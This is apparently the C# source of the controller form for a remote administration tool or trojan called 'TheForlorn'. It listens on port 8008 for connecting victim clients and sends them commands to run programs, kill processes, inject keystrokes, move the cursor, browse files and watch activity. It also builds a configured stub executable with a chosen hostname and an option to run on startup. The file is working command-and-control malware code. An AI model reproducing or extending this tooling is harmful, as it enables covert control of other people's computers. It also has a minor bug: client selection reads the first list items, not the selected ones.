using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ForlornStub;

namespace TheForlorn
{
    using System.Diagnostics;
    using System.IO;

    public partial class Main : Form
    {
        SocketHelper sh;

        public Main()
        {
            InitializeComponent();
        }

        private void Listen()
        {
            this.StopListening();

            sh = new SocketHelper(8008)
            {
                //OnReceiveDataCallback = OnReceiveData,
                OnConnectCallback = OnClientConnected,
                OnDisconnectCallback = OnClientDisconnected
            };

            sh.OnReceiveCommandCallback.Add(OnReceiveCommand);
            //this.UpdateToolstrip();
        }

        private void StopListening()
        {
            if (sh != null)
            {
                sh.Stop();
                sh = null;
                //this.UpdateToolstrip();
                System.Threading.Thread.Sleep(250);
            }
                
        }

        private void UpdateForm()
        {
            lstClients.Invoke((MethodInvoker) delegate
            {
                this.UpdateToolstrip();
                this.UpdateListView();
            }, null);
        }

        private void UpdateToolstrip()
        {
            bool listening = sh != null;

            tsConnected.Text = "(" + (listening ? sh.Clients.Count : 0).ToString() + " clients)";

            if (listening)
            {
                tsListening.Text = String.Format("Listening on {0}", sh.ListeningPort);
                tsListening.ForeColor = Color.Green;
            }
            else
            {
                tsListening.Text = "Not Listening";
                tsListening.ForeColor = Color.Red;
            }
        }

        // TODO: don't delete everything in list while updating
        private void UpdateListView()
        {
           if (sh == null || sh.Clients.Count <= 0)
            {
                lstClients.Items.Clear();
                return;
            }

            lstClients.BeginUpdate();
            lstClients.Items.Clear();

            foreach (KeyValuePair<string, SocketState> kvp in sh.Clients)
            {
                if (lstClients.Items.ContainsKey(kvp.Key)) continue;
                if (kvp.Value.Tag == null || lstClients.Items.ContainsKey(kvp.Key)) continue;
                ListViewItem lvi = new ListViewItem(kvp.Key);
                // vulnerable to fake clients
                foreach (string s in kvp.Value.Tag)
                {
                    lvi.SubItems.Add(new ListViewItem.ListViewSubItem(lvi, s));
                }
                lstClients.Items.Add(lvi);
            }
            lstClients.EndUpdate();

            foreach (ColumnHeader ch in lstClients.Columns)
            {
                ch.Width = -2;
            }
        }

        private void listenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (sh == null)
            {
                listenToolStripMenuItem.Text = "Stop Listening";
                this.Listen();
            }
            else
            {
                listenToolStripMenuItem.Text = "Listen";
                this.StopListening();
            }

            this.UpdateForm();
        }

        public bool OnReceiveCommand(SocketState cs, Command c)
        {
            this.HandleCommand(c, cs);
            return true;
        }

        private void HandleCommand(Command c, SocketState cs)
        {
            CommandState cmdState = CommandHandler.HandleCommand(c, cs);

            if(cmdState.UpdateForm)
            {
                this.UpdateForm();
            }
        }

        public void OnClientConnected(SocketState cs)
        {
#if DEBUG
            //MessageBox.Show(cs.Connection.RemoteEndPoint.ToString() + " has connected!");
            //sh.Send(cs, new Command(Command.Type.Screenshot));
#endif
            this.UpdateForm();
        }

        public void OnClientDisconnected(SocketState cs)
        {
#if DEBUG
            MessageBox.Show(cs.Connection.RemoteEndPoint.ToString() + " has disconnected!");
#endif
            this.UpdateForm();
        }

        private void SendCommandToSelectedClients(Command c)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                if (!sh.Clients.ContainsKey(lvi.Text)) continue;

                SocketState cs = sh.Clients[lvi.Text];
                sh.Send(cs, c);
            }
        }

        private SocketState[] GetSelectedClients()
        {
            SocketState[] selectedClients = new SocketState[lstClients.SelectedItems.Count];
            
            for(int i = 0; i < selectedClients.Length; i++)
            {
                ListViewItem lvi = lstClients.Items[i];

                if (!sh.Clients.ContainsKey(lvi.Text)) continue;

                selectedClients[i] = sh.Clients[lvi.Text];
            }

            return selectedClients;
        }

        private void Main_Load(object sender, EventArgs e)
        {
#if DEBUG
            Listen();
#endif

            this.UpdateToolstrip();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Created by AlbinoDrought");
        }

        private void runToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string fileToRun = Prompt.ShowDialog("Enter name of file to run:", "Run File");
            string arguments = Prompt.ShowDialog("Enter arguments: (optional)", "Run File");

            if (fileToRun.Length <= 0) return;

            SendCommandToSelectedClients(new Command(Command.Type.Open, fileToRun, arguments));
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string fileToKill = Prompt.ShowDialog("Enter name of process to kill:", "Kill Process");
            
            if (fileToKill.Length <= 0) return;

            SendCommandToSelectedClients(new Command(Command.Type.Kill, fileToKill));
        }

        private void listToolStripMenuItem_Click(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        private void sendKeysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string keysToSend = Prompt.ShowDialog("Enter keys to send:", "Send Keys");

            if (keysToSend.Length <= 0) return;

            SendCommandToSelectedClients(new Command(Command.Type.SendText, keysToSend));
        }

        private void moveMouseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string xCoord = Prompt.ShowDialog("Enter new x co-ordinate:", "Move Mouse");
            string yCoord = Prompt.ShowDialog("Enter new y co-ordinate:", "Move Mouse");

            if (xCoord.Length <= 0 || yCoord.Length <= 0) return;
            int x, y;
            try
            {
                x = Convert.ToInt32(xCoord);
                y = Convert.ToInt32(yCoord);
            }
            catch (Exception)
            {
                return;
            }

            SendCommandToSelectedClients(new Command(Command.Type.CursorPosition, xCoord, yCoord));
        }

        private void buildServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(File.Exists("generatedStub.exe"))
            {
                File.Delete("generatedStub.exe");
            }

            File.Copy("ForlornStub.exe", "generatedStub.exe");
            EOF.SetSettings("generatedStub.exe", new StubSettings()
            {
                HostName = Prompt.ShowDialog("Hostname:", "Build Stub"),
                Identifier = Prompt.ShowDialog("Identifier:", "Build Stub"),
                Port = 8008,
                RunOnStartup = false
            });
        }

        private void debugToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WatchForm wf = new WatchForm(sh, GetSelectedClients()[0]);
            wf.Show();
        }

        private void browseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FileBrowser fb = new FileBrowser(GetSelectedClients()[0], sh);
            fb.Show();
        }
    }
}
